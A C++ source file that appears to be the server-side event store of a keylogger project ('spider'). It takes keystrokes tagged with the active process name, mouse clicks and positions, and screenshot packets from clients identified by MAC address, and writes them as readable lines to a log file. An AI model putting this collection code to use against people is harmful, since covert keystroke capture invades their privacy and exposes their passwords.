#include "EventStorage.h"
#include "Logger.hpp"
#include "Keys.h"
#include <cstring>
#include <map>
#include <chrono>

namespace spider
{
  namespace server
  {
    EventStorage::EventStorage() : header(), ev()
    {
    }

    EventStorage::~EventStorage()
    {
    }

    EventStorage::EventStorage(EventStorage const &other) noexcept
        : header(other.header), ev(other.ev)
    {
    }

    EventStorage &EventStorage::operator=(EventStorage const &other) noexcept
    {
      if (this != &other)
	{
	  header = other.header;
	  ev = other.ev;
	}
      return (*this);
    }

    Storage::Storage() : m_storage{}, m_logFile()
    {
      m_logFile.open ("event.log", std::ios_base::app);
      m_logFile << "===Logging started===\n";
    }

    Storage::~Storage()
    {
      m_logFile.close();
    }

    void Storage::push(EventStorage const &ev)
    {
      m_storage.push(ev);
    }

    void Storage::write()
    {
      // TODO: Handle if unknown key / state / type
      static std::map<network::tcp::PacketEventState, std::string> const
        stateMap = {{network::tcp::PacketEventState::Down, "Down"},
          {network::tcp::PacketEventState::Up, "Up"}};
      static std::map<network::tcp::PacketType, std::string> const typeMap = {
        {network::tcp::PacketType::KeyboardEvent, "Keyboard"},
        {network::tcp::PacketType::MouseButton, "MouseClick"},
        {network::tcp::PacketType::MousePosition, "MousePosition"},
        {network::tcp::PacketType::Screenshot, "Screenshot"},
        {network::tcp::PacketType::Infos, "Infos"}};
      static std::map<client::library::MouseButton, std::string> const
        mouseButtonMap = {
          {client::library::MouseButton::None, "None"},
          {client::library::MouseButton::ButtonLeft, "ButtonLeft"},
          {client::library::MouseButton::ButtonRight, "ButtonRight"}};
      static std::map<client::library::KeyboardKey, std::string> const keyMap =
      {{client::library::KeyboardKey::KB_A, "a"},
        {client::library::KeyboardKey::KB_B, "b"},
        {client::library::KeyboardKey::KB_C, "c"},
        {client::library::KeyboardKey::KB_D, "d"},
        {client::library::KeyboardKey::KB_E, "e"},
        {client::library::KeyboardKey::KB_F, "f"},
        {client::library::KeyboardKey::KB_G, "g"},
        {client::library::KeyboardKey::KB_H, "h"},
        {client::library::KeyboardKey::KB_I, "i"},
        {client::library::KeyboardKey::KB_J, "j"},
        {client::library::KeyboardKey::KB_K, "k"},
        {client::library::KeyboardKey::KB_L, "l"},
        {client::library::KeyboardKey::KB_M, "m"},
        {client::library::KeyboardKey::KB_N, "n"},
        {client::library::KeyboardKey::KB_O, "o"},
        {client::library::KeyboardKey::KB_P, "p"},
        {client::library::KeyboardKey::KB_Q, "q"},
        {client::library::KeyboardKey::KB_R, "r"},
        {client::library::KeyboardKey::KB_S, "s"},
        {client::library::KeyboardKey::KB_T, "t"},
        {client::library::KeyboardKey::KB_U, "u"},
        {client::library::KeyboardKey::KB_V, "v"},
        {client::library::KeyboardKey::KB_W, "w"},
        {client::library::KeyboardKey::KB_X, "x"},
        {client::library::KeyboardKey::KB_Y, "y"},
        {client::library::KeyboardKey::KB_Z, "z"},
        {client::library::KeyboardKey::KB_0, "0"},
        {client::library::KeyboardKey::KB_1, "1"},
        {client::library::KeyboardKey::KB_2, "2"},
        {client::library::KeyboardKey::KB_3, "3"},
        {client::library::KeyboardKey::KB_4, "4"},
        {client::library::KeyboardKey::KB_5, "5"},
        {client::library::KeyboardKey::KB_6, "6"},
        {client::library::KeyboardKey::KB_7, "7"},
        {client::library::KeyboardKey::KB_8, "8"},
        {client::library::KeyboardKey::KB_9, "9"},
        {client::library::KeyboardKey::KB_ARROW_LEFT, "<left arrow>"},
        {client::library::KeyboardKey::KB_ARROW_RIGHT, "<right arrow>"},
        {client::library::KeyboardKey::KB_ARROW_UP, "<up arrow>"},
        {client::library::KeyboardKey::KB_ARROW_DOWN, "<down arrow>"},
        {client::library::KeyboardKey::KB_SPACE, "<space>"},
        {client::library::KeyboardKey::KB_ENTER, "<enter>"},
        {client::library::KeyboardKey::KB_SPACE, "<space>"},
        {client::library::KeyboardKey::KB_BACKSPACE, "<backspace>"},
        {client::library::KeyboardKey::KB_LCTRL, "<left ctrl>"},
        {client::library::KeyboardKey::KB_RCTRL, "<right ctrl>"},
        {client::library::KeyboardKey::KB_LALT, "<left alt>"},
        {client::library::KeyboardKey::KB_RALT, "<right alt>"},
        {client::library::KeyboardKey::KB_LSHIFT, "<left shift>"},
        {client::library::KeyboardKey::KB_RSHIFT, "<right shift>"},
        {client::library::KeyboardKey::KB_CAPSLOCK, "<capslock>"},
        {client::library::KeyboardKey::KB_TAB, "<tab>"},
        {client::library::KeyboardKey::KB_ESCAPE, "<escape>"},
        {client::library::KeyboardKey::KB_PAGEUP, "<page up>"},
        {client::library::KeyboardKey::KB_PAGEDOWN, "<page down>"},
        {client::library::KeyboardKey::KB_HOME, "<home>"},
        {client::library::KeyboardKey::KB_END, "<end>"},
        {client::library::KeyboardKey::KB_FN1, "<function key 1>"},
        {client::library::KeyboardKey::KB_FN2, "<function key 2>"},
        {client::library::KeyboardKey::KB_FN3, "<function key 3>"},
        {client::library::KeyboardKey::KB_FN4, "<function key 4>"},
        {client::library::KeyboardKey::KB_FN5, "<function key 5>"},
        {client::library::KeyboardKey::KB_FN6, "<function key 6>"},
        {client::library::KeyboardKey::KB_FN7, "<function key 7>"},
        {client::library::KeyboardKey::KB_FN8, "<function key 8>"},
        {client::library::KeyboardKey::KB_FN9, "<function key 9>"},
        {client::library::KeyboardKey::KB_FN10, "<function key 10>"},
        {client::library::KeyboardKey::KB_FN11, "<function key 11>"},
        {client::library::KeyboardKey::KB_FN12, "<function key 12>"},
        {client::library::KeyboardKey::KB_FN13, "<function key 13>"},
        {client::library::KeyboardKey::KB_FN14, "<function key 14>"},
        {client::library::KeyboardKey::KB_FN15, "<function key 15>"},
        {client::library::KeyboardKey::KB_FN16, "<function key 16>"},
        {client::library::KeyboardKey::KB_FN17, "<function key 17>"},
        {client::library::KeyboardKey::KB_FN18, "<function key 18>"},
        {client::library::KeyboardKey::KB_FN19, "<function key 19>"},
        {client::library::KeyboardKey::KB_FN20, "<function key 20>"},
        {client::library::KeyboardKey::KB_FN21, "<function key 21>"},
        {client::library::KeyboardKey::KB_FN22, "<function key 22>"},
        {client::library::KeyboardKey::KB_FN23, "<function key 23>"},
        {client::library::KeyboardKey::KB_FN24, "<function key 24>"},
        {client::library::KeyboardKey::KB_COMMA, ","},
        {client::library::KeyboardKey::KB_DOT, "."},
        {client::library::KeyboardKey::KB_SLASH, "/"},
        {client::library::KeyboardKey::KB_INFERIOR, "<"},
        {client::library::KeyboardKey::KB_SUPERIOR, ">"},
        {client::library::KeyboardKey::KB_QUESTION, "?"},
        {client::library::KeyboardKey::KB_SEMICOLON, ";"},
        {client::library::KeyboardKey::KB_COLON, ":"},
        {client::library::KeyboardKey::KB_BACKQUOTE, "`"},
        {client::library::KeyboardKey::KB_SIMPLEQUOTE, "'"},
        {client::library::KeyboardKey::KB_DOUBLEQUOTE, "\""},
        {client::library::KeyboardKey::KB_LEFTBRACE, "{"},
        {client::library::KeyboardKey::KB_RIGHTBRACE, "}"},
        {client::library::KeyboardKey::KB_LEFTBRACKET, "["},
        {client::library::KeyboardKey::KB_RIGHTBRACKET, "]"},
        {client::library::KeyboardKey::KB_LEFTPAREN, "("},
        {client::library::KeyboardKey::KB_RIGHTPAREN, ")"},
        {client::library::KeyboardKey::KB_BACKSLASH, "\\"},
        {client::library::KeyboardKey::KB_VERTICALBAR, "|"},
        {client::library::KeyboardKey::KB_EXCLAMATION, "!"},
        {client::library::KeyboardKey::KB_ATSYMBOL, "@"},
        {client::library::KeyboardKey::KB_HASHTAG, "#"},
        {client::library::KeyboardKey::KB_DOLLAR, "$"},
        {client::library::KeyboardKey::KB_PERCENT, "%"},
        {client::library::KeyboardKey::KB_CIRCUMFLEX, "^"},
        {client::library::KeyboardKey::KB_AMPERSAND, "&"},
        {client::library::KeyboardKey::KB_ASTERISK, "*"},
        {client::library::KeyboardKey::KB_TILDE, "~"},
        {client::library::KeyboardKey::KB_UNDERSCORE, "_"},
        {client::library::KeyboardKey::KB_MINUS, "-"},
        {client::library::KeyboardKey::KB_PLUS, "+"},
        {client::library::KeyboardKey::KB_EQUALS, "="},
        {client::library::KeyboardKey::KB_DELETE, "<delete>"},
        {client::library::KeyboardKey::KB_NUMLOCK, "<numlock>"},
        {client::library::KeyboardKey::KB_SCROLL, "<scroll lock>"},
        {client::library::KeyboardKey::KB_LCMD, "<left command>"},
        {client::library::KeyboardKey::KB_RCMD, "<right command>"},
        {client::library::KeyboardKey::KB_NONE, "<unknown>"}};

      while (!m_storage.empty())
      {
        EventStorage const &store = m_storage.front();

        std::string msg(
            reinterpret_cast<char const *>(store.header.macAddress.data()));
        msg += " - " +
          timeToString(static_cast<std::time_t>(store.header.time)) +
          " - " + typeMap.at(store.header.type) + " - ";

        switch (store.header.type)
        {
          case network::tcp::PacketType::KeyboardEvent:
            {
              std::string key = keyMap.at(
                  static_cast<client::library::KeyboardKey>(store.ev.key));
              if (store.ev.shift)
              {
                // Handle if shift is pressed
              }

              msg += key + " - " + stateMap.at(store.ev.state) + " [" +
                reinterpret_cast<char const *>(
                    store.ev.processName.data()) +
                "]";
            }
            break;
          case network::tcp::PacketType::MouseButton:
            msg +=
              mouseButtonMap.at(static_cast<client::library::MouseButton>(
                    store.ev.key)) +
              " - " + stateMap.at(store.ev.state) + " [" +
              reinterpret_cast<char const *>(store.ev.processName.data()) +
              "]";
            break;
          case network::tcp::PacketType::MousePosition:
            msg += std::to_string(store.mov.posX) + " - " +
              std::to_string(store.mov.posY) + " [" +
              reinterpret_cast<char const *>(
                  store.mov.processName.data()) +
              "]";
            break;
          case network::tcp::PacketType::Screenshot:
            break;
          case network::tcp::PacketType::Infos:
            break;
        }

        nope::log::Log(Info) << msg;
        m_storage.pop();
      }
    }

    std::string Storage::timeToString(std::time_t const rawtime) const
    {
      struct tm *dt;
      std::array<char, 30> buffer{};

      dt = std::localtime(&rawtime);
      std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
      return std::string(buffer.data());
    }
  }
}
